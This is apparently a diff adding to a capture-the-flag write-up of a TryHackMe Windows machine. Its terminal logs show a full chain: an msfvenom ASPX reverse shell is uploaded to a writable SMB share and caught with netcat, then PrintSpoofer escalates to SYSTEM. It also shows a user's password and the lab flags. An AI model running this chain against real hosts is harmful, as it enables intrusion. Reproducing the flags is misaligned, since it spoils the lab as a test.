@@ -186,3 +186,192 @@ the correct one
 ┌──(kali㉿kali)-[~/skynet/daily_bugle]
 └─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 
 Cloning into 'AutoBlue-MS17-010'...
+remote: Enumerating objects: 126, done.
+remote: Counting objects: 100% (50/50), done.
+remote: Compressing objects: 100% (15/15), done.
+remote: Total 126 (delta 40), reused 35 (delta 35), pack-reused 76
+Receiving objects: 100% (126/126), 94.22 KiB | 542.00 KiB/s, done.
+Resolving deltas: 100% (74/74), done.
+
+Executing the exploit using the following flags
+
+    -target-ip to specify the IP address of the vulnerable Windows machine
+    -port to specify the SMB port in use
+    the credentials to connect as, in order to execute the exploit, in this case using the Bob user’s credentials
+```
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle/AutoBlue-MS17-010]
+└─$ python zzz_exploit.py -target-ip 10.10.3.92 -port 445 'Bob:!P@$$W0rD!123'
+
+some problems let's do normally because with this method we get admin quickly
+
+Upload reverse shell
+
+Interestingly, the network share is writable, which means we can upload arbitrary files. Let’s first generate a reverse shell with msfvenom: 
+
+This can be exploited by uploading a ASP/ASPX shell onto the SMB share and executing it from within the browser.
+
+The first step is to generate some shellcode using MSFvenom with the following flags:
+
+    -p to specify the payload type, in this case, the Windows TCP Reverse Shell
+    LHOST to specify the localhost IP address to connect to
+    LPORT to specify the local port to connect to
+    -f to specify the format for the shell, in this case, ASPX
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.81.220 lport=443 -f aspx > shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3392 bytes
+
+Accessing the “nt4wrksv” SMB share enabled and uploading the ASPX reverse shell:
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ smbclient //10.10.3.92/nt4wrksv
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> pu shell.aspx
+putting file shell.aspx as \shell.aspx (5.4 kb/s) (average 5.4 kb/s)
+smb: \> put shell.aspx
+putting file shell.aspx as \shell.aspx (5.2 kb/s) (average 5.3 kb/s)
+smb: \> exit
+
+When accessing the shell.aspx file through a browser, the reverse shell is executed
+
+http://10.10.3.92:49663/nt4wrksv/shell.aspx
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle/AutoBlue-MS17-010]
+└─$ sudo nc -nlvp 443                                                        
+[sudo] password for kali: 
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.3.92.
+Ncat: Connection from 10.10.3.92:49898.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+c:\windows\system32\inetsrv>more C:\Users\bob\Desktop\user.txt
+more C:\Users\bob\Desktop\user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+
+priv esc
+
+Running the “whoami /priv” command to check the current user’s privileges in the system:
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+It appears the current user has the SeImpersonatePrivilege token enabled, which means token impersonation could be used to escalate privileges.
+
+Although Juicy Potato is normally used to exploit token impersonation, this only works if DCOM is enabled on the server. A great alternative is the PrintSpoofer exploit. Downloading the exploit from the Git repository and placing it on the nt4wrksv SMB share so it can be easily transferred to the target machine:
+
+┌──(root㉿kali)-[/home/kali/skynet/daily_bugle]
+└─# wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
+--2022-09-27 23:25:51--  https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
+Resolving github.com (github.com)... 140.82.112.4
+Connecting to github.com (github.com)|140.82.112.4|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe [following]
+--2022-09-27 23:25:57--  https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 27136 (26K) [application/octet-stream]
+Saving to: ‘PrintSpoofer.exe’
+
+PrintSpoofer.exe             100%[============================================>]  26.50K  --.-KB/s    in 0.001s  
+
+2022-09-27 23:25:57 (23.9 MB/s) - ‘PrintSpoofer.exe’ saved [27136/27136]
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ smbclient //10.10.3.92/nt4wrksv  
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> put PrintSpoofer.exe
+putting file PrintSpoofer.exe as \PrintSpoofer.exe (30.6 kb/s) (average 30.6 kb/s)
+smb: \> exit
+
+Executing the exploit, providing -i to Interact with the new process in the current command prompt and -c to specify to run CMD upon execution:
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+
+c:\windows\system32\inetsrv>cd c:\inetpub\wwwroot\nt4wrksv 
+cd c:\inetpub\wwwroot\nt4wrksv
+
+c:\inetpub\wwwroot\nt4wrksv>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\inetpub\wwwroot\nt4wrksv>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC3C-5CB5
+
+ Directory of c:\inetpub\wwwroot\nt4wrksv
+
+09/27/2022  08:27 PM    <DIR>          .
+09/27/2022  08:27 PM    <DIR>          ..
+07/25/2020  08:15 AM                98 passwords.txt
+09/27/2022  08:27 PM            27,136 PrintSpoofer.exe
+09/27/2022  08:16 PM             3,392 shell.aspx
+               3 File(s)         30,626 bytes
+               2 Dir(s)  21,042,872,320 bytes free
+
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
+more C:\Users\Administrator\Desktop\root.txt
+THM{1fk5kf469devly1gl320zafgl345pv}
+```
+![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/05/image-306.png?w=1024&ssl=1)
+User Flag
+Root Flag
+
+## Flags / Answers
+- ***THM{fdk4ka34vk346ksxfr21tg789ktf45}***
+- ***THM{1fk5kf469devly1gl320zafgl345pv}***
+
+## Notes / Lessons Learned
+[[Daily Bugle]]
+
